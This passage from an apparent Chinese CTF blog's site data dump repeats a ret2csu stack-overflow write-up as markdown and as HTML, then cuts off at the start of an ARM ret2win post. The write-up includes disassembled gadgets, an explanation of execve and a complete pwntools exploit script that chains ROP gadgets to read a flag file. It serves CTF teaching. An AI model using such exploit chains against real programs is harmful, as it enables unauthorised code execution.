rbp,rbx\n0x0000000000400724 <+84>: jne    0x400710 <__libc_csu_init+64>\n0x0000000000400726 <+86>: add    rsp,0x8\n0x000000000040072a <+90>: pop    rbx\n0x000000000040072b <+91>: pop    rbp\n0x000000000040072c <+92>: pop    r12\n0x000000000040072e <+94>: pop    r13\n0x0000000000400730 <+96>: pop    r14\n0x0000000000400732 <+98>: pop    r15\n0x0000000000400734 <+100>: ret \n```\n\n从0x40072a开始可以控制rbx,rbp,r12,r13,r14,r15，之后程序控制返回0x400710可以将r15,r14,r13d的内容放入rdx,rsi,rdi，并调用r12+rbx*8指向位置的指令。\n\n我们知道64位程序中rdi,rsi,rdx用于存放前三个参数。因此，我们只要将前三个参数放入r13,r14,r15，再把要执行的指令放入r12，设置rbx为0，即可执行*(void*)r12(r13d,r14,r15)。\n\n要注意的是r13只会传入低4字节，不过本题中的第一个参数的地址只有三字节，没影响。\n\n此外，execve的详细内容也可以看一下。\n\n```c\nint execve(const char *file,char *const argv[],char *const envp[])\nint main(int argc,char* argv[])\n```\n\nexecve有三个参数，第一个file是要打开的文件路径，第二个argv是传入的参数，第三个envp是环境变量。execve会将当前进程的内存映像替换为file指向的文件，并将argv作为其main函数的参数argv，环境变量通常为0(NULL)。\n\n一般来说如果调用execve(\"/bin/sh\",0,0)可以直接获得shell。\n\n不过如果要使用argv的话，会有些不同，要写成execve(\"/bin/sh\",{\"/bin/sh\",\"file\",0})，此时shell会**作为一个shell脚本解释器**来分析file这个路径指向的文件。**argv**的第一个参数要**和执行的程序一样**（此处为\"/bin/sh\"），第二个参数是分析的sh文件的**路径**，第三个参数是0，如果出错了可以将错误内容从stderr输出。\n\n因此在本题中，使用的是\"/bin/cat\"，argv={\"/bin/cat\",\"flag\",NULL}。execve(\"/bin/cat\",{\"/bin/cat\",\"flag\",NULL},0),这样就可以把flag文件打印出来了\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n#libc=ELF('')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nargv=0x601050#gift2->{\"/bin/sh\",\"flag\",0}\ncat=0x00000000004007BB#gift1->/bin/cat\nexecv=0x0000000000601068 #gift3->0x400648\npop_addr=0x000000000040072a\nmov_addr=0x0000000000400710\n\npayload='a'*0x20+p64(0)+p64(pop_addr)+p64(0)+p64(1)+p64(execv)+p64(cat)+p64(argv)+p64(0)+p64(mov_addr)\ndebug()\n#r()\nsl(payload)\nitr()\n```\n","source":"_posts/ret2csu1.md","raw":"---\ntitle: ret2csu1\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- stackoverflow\n- ROP\n---\nNewStar，ret2csu\n\n<!--more-->\n\n64位栈溢出，保护都只开了NX，message大小为0x20却可以输入0x70。\n\n有一个后门，但是参数不对，可以尝试栈溢出修改寄存器的值后再调用execve。\n\n```c\nvoid __cdecl ohMyBackdoor(__int64_t a, __int64_t b, __int64_t c)\n{\n  signed __int64 v3; // rax\n\n  if ( a == 'Fallw1nd' && b == 'WantsAGI' && c == 'rlfriend' )\n    v3 = sys_execve((const char *)'Fallw1nd', (const char *const *)b, (const char *const *)'rlfriend');\n}\n```\n\n要修改三个参数不太容易，要用到__libc_csu_init中的gadget。\n\n```c\n0x0000000000400710 <+64>: mov    rdx,r15\n0x0000000000400713 <+67>: mov    rsi,r14\n0x0000000000400716 <+70>: mov    edi,r13d\n0x0000000000400719 <+73>: call   QWORD PTR [r12+rbx*8]\n0x000000000040071d <+77>: add    rbx,0x1\n0x0000000000400721 <+81>: cmp    rbp,rbx\n0x0000000000400724 <+84>: jne    0x400710 <__libc_csu_init+64>\n0x0000000000400726 <+86>: add    rsp,0x8\n0x000000000040072a <+90>: pop    rbx\n0x000000000040072b <+91>: pop    rbp\n0x000000000040072c <+92>: pop    r12\n0x000000000040072e <+94>: pop    r13\n0x0000000000400730 <+96>: pop    r14\n0x0000000000400732 <+98>: pop    r15\n0x0000000000400734 <+100>: ret \n```\n\n从0x40072a开始可以控制rbx,rbp,r12,r13,r14,r15，之后程序控制返回0x400710可以将r15,r14,r13d的内容放入rdx,rsi,rdi，并调用r12+rbx*8指向位置的指令。\n\n我们知道64位程序中rdi,rsi,rdx用于存放前三个参数。因此，我们只要将前三个参数放入r13,r14,r15，再把要执行的指令放入r12，设置rbx为0，即可执行*(void*)r12(r13d,r14,r15)。\n\n要注意的是r13只会传入低4字节，不过本题中的第一个参数的地址只有三字节，没影响。\n\n此外，execve的详细内容也可以看一下。\n\n```c\nint execve(const char *file,char *const argv[],char *const envp[])\nint main(int argc,char* argv[])\n```\n\nexecve有三个参数，第一个file是要打开的文件路径，第二个argv是传入的参数，第三个envp是环境变量。execve会将当前进程的内存映像替换为file指向的文件，并将argv作为其main函数的参数argv，环境变量通常为0(NULL)。\n\n一般来说如果调用execve(\"/bin/sh\",0,0)可以直接获得shell。\n\n不过如果要使用argv的话，会有些不同，要写成execve(\"/bin/sh\",{\"/bin/sh\",\"file\",0})，此时shell会**作为一个shell脚本解释器**来分析file这个路径指向的文件。**argv**的第一个参数要**和执行的程序一样**（此处为\"/bin/sh\"），第二个参数是分析的sh文件的**路径**，第三个参数是0，如果出错了可以将错误内容从stderr输出。\n\n因此在本题中，使用的是\"/bin/cat\"，argv={\"/bin/cat\",\"flag\",NULL}。execve(\"/bin/cat\",{\"/bin/cat\",\"flag\",NULL},0),这样就可以把flag文件打印出来了\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n#libc=ELF('')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nargv=0x601050#gift2->{\"/bin/sh\",\"flag\",0}\ncat=0x00000000004007BB#gift1->/bin/cat\nexecv=0x0000000000601068 #gift3->0x400648\npop_addr=0x000000000040072a\nmov_addr=0x0000000000400710\n\npayload='a'*0x20+p64(0)+p64(pop_addr)+p64(0)+p64(1)+p64(execv)+p64(cat)+p64(argv)+p64(0)+p64(mov_addr)\ndebug()\n#r()\nsl(payload)\nitr()\n```\n","slug":"ret2csu1","published":1,"updated":"2023-01-12T12:10:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagg005m5oudgc3fes1u","content":"<p>NewStar，ret2csu</p>\n<span id=\"more\"></span>\n\n<p>64位栈溢出，保护都只开了NX，message大小为0x20却可以输入0x70。</p>\n<p>有一个后门，但是参数不对，可以尝试栈溢出修改寄存器的值后再调用execve。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">ohMyBackdoor</span><span class=\"params\">(<span class=\"type\">__int64_t</span> a, <span class=\"type\">__int64_t</span> b, <span class=\"type\">__int64_t</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">signed</span> __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a == <span class=\"string\">&#x27;Fallw1nd&#x27;</span> &amp;&amp; b == <span class=\"string\">&#x27;WantsAGI&#x27;</span> &amp;&amp; c == <span class=\"string\">&#x27;rlfriend&#x27;</span> )</span><br><span class=\"line\">    v3 = sys_execve((<span class=\"type\">const</span> <span class=\"type\">char</span> *)<span class=\"string\">&#x27;Fallw1nd&#x27;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> *)b, (<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> *)<span class=\"string\">&#x27;rlfriend&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>要修改三个参数不太容易，要用到__libc_csu_init中的gadget。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0000000000400710</span> &lt;+<span class=\"number\">64</span>&gt;: mov    rdx,r15</span><br><span class=\"line\"><span class=\"number\">0x0000000000400713</span> &lt;+<span class=\"number\">67</span>&gt;: mov    rsi,r14</span><br><span class=\"line\"><span class=\"number\">0x0000000000400716</span> &lt;+<span class=\"number\">70</span>&gt;: mov    edi,r13d</span><br><span class=\"line\"><span class=\"number\">0x0000000000400719</span> &lt;+<span class=\"number\">73</span>&gt;: call   QWORD PTR [r12+rbx*<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0x000000000040071d</span> &lt;+<span class=\"number\">77</span>&gt;: add    rbx,<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400721</span> &lt;+<span class=\"number\">81</span>&gt;: cmp    rbp,rbx</span><br><span class=\"line\"><span class=\"number\">0x0000000000400724</span> &lt;+<span class=\"number\">84</span>&gt;: jne    <span class=\"number\">0x400710</span> &lt;__libc_csu_init+<span class=\"number\">64</span>&gt;</span><br><span class=\"line\"><span class=\"number\">0x0000000000400726</span> &lt;+<span class=\"number\">86</span>&gt;: add    rsp,<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0x000000000040072a</span> &lt;+<span class=\"number\">90</span>&gt;: pop    rbx</span><br><span class=\"line\"><span class=\"number\">0x000000000040072b</span> &lt;+<span class=\"number\">91</span>&gt;: pop    rbp</span><br><span class=\"line\"><span class=\"number\">0x000000000040072c</span> &lt;+<span class=\"number\">92</span>&gt;: pop    r12</span><br><span class=\"line\"><span class=\"number\">0x000000000040072e</span> &lt;+<span class=\"number\">94</span>&gt;: pop    r13</span><br><span class=\"line\"><span class=\"number\">0x0000000000400730</span> &lt;+<span class=\"number\">96</span>&gt;: pop    r14</span><br><span class=\"line\"><span class=\"number\">0x0000000000400732</span> &lt;+<span class=\"number\">98</span>&gt;: pop    r15</span><br><span class=\"line\"><span class=\"number\">0x0000000000400734</span> &lt;+<span class=\"number\">100</span>&gt;: ret </span><br></pre></td></tr></table></figure>\n\n<p>从0x40072a开始可以控制rbx,rbp,r12,r13,r14,r15，之后程序控制返回0x400710可以将r15,r14,r13d的内容放入rdx,rsi,rdi，并调用r12+rbx*8指向位置的指令。</p>\n<p>我们知道64位程序中rdi,rsi,rdx用于存放前三个参数。因此，我们只要将前三个参数放入r13,r14,r15，再把要执行的指令放入r12，设置rbx为0，即可执行*(void*)r12(r13d,r14,r15)。</p>\n<p>要注意的是r13只会传入低4字节，不过本题中的第一个参数的地址只有三字节，没影响。</p>\n<p>此外，execve的详细内容也可以看一下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">execve</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *file,<span class=\"type\">char</span> *<span class=\"type\">const</span> argv[],<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[])</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span></span><br></pre></td></tr></table></figure>\n\n<p>execve有三个参数，第一个file是要打开的文件路径，第二个argv是传入的参数，第三个envp是环境变量。execve会将当前进程的内存映像替换为file指向的文件，并将argv作为其main函数的参数argv，环境变量通常为0(NULL)。</p>\n<p>一般来说如果调用execve(“/bin/sh”,0,0)可以直接获得shell。</p>\n<p>不过如果要使用argv的话，会有些不同，要写成execve(“/bin/sh”,{“/bin/sh”,”file”,0})，此时shell会<strong>作为一个shell脚本解释器</strong>来分析file这个路径指向的文件。<strong>argv</strong>的第一个参数要<strong>和执行的程序一样</strong>（此处为”/bin/sh”），第二个参数是分析的sh文件的<strong>路径</strong>，第三个参数是0，如果出错了可以将错误内容从stderr输出。</p>\n<p>因此在本题中，使用的是”/bin/cat”，argv={“/bin/cat”,”flag”,NULL}。execve(“/bin/cat”,{“/bin/cat”,”flag”,NULL},0),这样就可以把flag文件打印出来了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">argv=<span class=\"number\">0x601050</span><span class=\"comment\">#gift2-&gt;&#123;&quot;/bin/sh&quot;,&quot;flag&quot;,0&#125;</span></span><br><span class=\"line\">cat=<span class=\"number\">0x00000000004007BB</span><span class=\"comment\">#gift1-&gt;/bin/cat</span></span><br><span class=\"line\">execv=<span class=\"number\">0x0000000000601068</span> <span class=\"comment\">#gift3-&gt;0x400648</span></span><br><span class=\"line\">pop_addr=<span class=\"number\">0x000000000040072a</span></span><br><span class=\"line\">mov_addr=<span class=\"number\">0x0000000000400710</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(pop_addr)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(execv)+p64(cat)+p64(argv)+p64(<span class=\"number\">0</span>)+p64(mov_addr)</span><br><span class=\"line\">debug()</span><br><span class=\"line\"><span class=\"comment\">#r()</span></span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>NewStar，ret2csu</p>","more":"<p>64位栈溢出，保护都只开了NX，message大小为0x20却可以输入0x70。</p>\n<p>有一个后门，但是参数不对，可以尝试栈溢出修改寄存器的值后再调用execve。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">ohMyBackdoor</span><span class=\"params\">(<span class=\"type\">__int64_t</span> a, <span class=\"type\">__int64_t</span> b, <span class=\"type\">__int64_t</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">signed</span> __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a == <span class=\"string\">&#x27;Fallw1nd&#x27;</span> &amp;&amp; b == <span class=\"string\">&#x27;WantsAGI&#x27;</span> &amp;&amp; c == <span class=\"string\">&#x27;rlfriend&#x27;</span> )</span><br><span class=\"line\">    v3 = sys_execve((<span class=\"type\">const</span> <span class=\"type\">char</span> *)<span class=\"string\">&#x27;Fallw1nd&#x27;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> *)b, (<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> *)<span class=\"string\">&#x27;rlfriend&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>要修改三个参数不太容易，要用到__libc_csu_init中的gadget。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0000000000400710</span> &lt;+<span class=\"number\">64</span>&gt;: mov    rdx,r15</span><br><span class=\"line\"><span class=\"number\">0x0000000000400713</span> &lt;+<span class=\"number\">67</span>&gt;: mov    rsi,r14</span><br><span class=\"line\"><span class=\"number\">0x0000000000400716</span> &lt;+<span class=\"number\">70</span>&gt;: mov    edi,r13d</span><br><span class=\"line\"><span class=\"number\">0x0000000000400719</span> &lt;+<span class=\"number\">73</span>&gt;: call   QWORD PTR [r12+rbx*<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0x000000000040071d</span> &lt;+<span class=\"number\">77</span>&gt;: add    rbx,<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400721</span> &lt;+<span class=\"number\">81</span>&gt;: cmp    rbp,rbx</span><br><span class=\"line\"><span class=\"number\">0x0000000000400724</span> &lt;+<span class=\"number\">84</span>&gt;: jne    <span class=\"number\">0x400710</span> &lt;__libc_csu_init+<span class=\"number\">64</span>&gt;</span><br><span class=\"line\"><span class=\"number\">0x0000000000400726</span> &lt;+<span class=\"number\">86</span>&gt;: add    rsp,<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0x000000000040072a</span> &lt;+<span class=\"number\">90</span>&gt;: pop    rbx</span><br><span class=\"line\"><span class=\"number\">0x000000000040072b</span> &lt;+<span class=\"number\">91</span>&gt;: pop    rbp</span><br><span class=\"line\"><span class=\"number\">0x000000000040072c</span> &lt;+<span class=\"number\">92</span>&gt;: pop    r12</span><br><span class=\"line\"><span class=\"number\">0x000000000040072e</span> &lt;+<span class=\"number\">94</span>&gt;: pop    r13</span><br><span class=\"line\"><span class=\"number\">0x0000000000400730</span> &lt;+<span class=\"number\">96</span>&gt;: pop    r14</span><br><span class=\"line\"><span class=\"number\">0x0000000000400732</span> &lt;+<span class=\"number\">98</span>&gt;: pop    r15</span><br><span class=\"line\"><span class=\"number\">0x0000000000400734</span> &lt;+<span class=\"number\">100</span>&gt;: ret </span><br></pre></td></tr></table></figure>\n\n<p>从0x40072a开始可以控制rbx,rbp,r12,r13,r14,r15，之后程序控制返回0x400710可以将r15,r14,r13d的内容放入rdx,rsi,rdi，并调用r12+rbx*8指向位置的指令。</p>\n<p>我们知道64位程序中rdi,rsi,rdx用于存放前三个参数。因此，我们只要将前三个参数放入r13,r14,r15，再把要执行的指令放入r12，设置rbx为0，即可执行*(void*)r12(r13d,r14,r15)。</p>\n<p>要注意的是r13只会传入低4字节，不过本题中的第一个参数的地址只有三字节，没影响。</p>\n<p>此外，execve的详细内容也可以看一下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">execve</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *file,<span class=\"type\">char</span> *<span class=\"type\">const</span> argv[],<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[])</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span>* argv[])</span></span><br></pre></td></tr></table></figure>\n\n<p>execve有三个参数，第一个file是要打开的文件路径，第二个argv是传入的参数，第三个envp是环境变量。execve会将当前进程的内存映像替换为file指向的文件，并将argv作为其main函数的参数argv，环境变量通常为0(NULL)。</p>\n<p>一般来说如果调用execve(“/bin/sh”,0,0)可以直接获得shell。</p>\n<p>不过如果要使用argv的话，会有些不同，要写成execve(“/bin/sh”,{“/bin/sh”,”file”,0})，此时shell会<strong>作为一个shell脚本解释器</strong>来分析file这个路径指向的文件。<strong>argv</strong>的第一个参数要<strong>和执行的程序一样</strong>（此处为”/bin/sh”），第二个参数是分析的sh文件的<strong>路径</strong>，第三个参数是0，如果出错了可以将错误内容从stderr输出。</p>\n<p>因此在本题中，使用的是”/bin/cat”，argv={“/bin/cat”,”flag”,NULL}。execve(“/bin/cat”,{“/bin/cat”,”flag”,NULL},0),这样就可以把flag文件打印出来了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">argv=<span class=\"number\">0x601050</span><span class=\"comment\">#gift2-&gt;&#123;&quot;/bin/sh&quot;,&quot;flag&quot;,0&#125;</span></span><br><span class=\"line\">cat=<span class=\"number\">0x00000000004007BB</span><span class=\"comment\">#gift1-&gt;/bin/cat</span></span><br><span class=\"line\">execv=<span class=\"number\">0x0000000000601068</span> <span class=\"comment\">#gift3-&gt;0x400648</span></span><br><span class=\"line\">pop_addr=<span class=\"number\">0x000000000040072a</span></span><br><span class=\"line\">mov_addr=<span class=\"number\">0x0000000000400710</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(pop_addr)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(execv)+p64(cat)+p64(argv)+p64(<span class=\"number\">0</span>)+p64(mov_addr)</span><br><span class=\"line\">debug()</span><br><span class=\"line\"><span class=\"comment\">#r()</span></span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"ret2win_armv5","date":"2023-03-23T09:35:17.000Z","_content":"\narm pwn入门题，arm下的ret2text。\n<!-- more -->\n\n### 查壳\n\n```sh\n# 32位动态链接\nret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped\n\n# 只开了NX\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/ret2win_armv5/ret2win_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n\n```\n\n### 逆向\n\n程序比较简单，在`pwnme`中有一个栈溢出，可以溢出`20byte`，存在一个`ret2win`的后面，控制返回到它就可以了。\n\n### exp\n\n```py\nfrom pwn 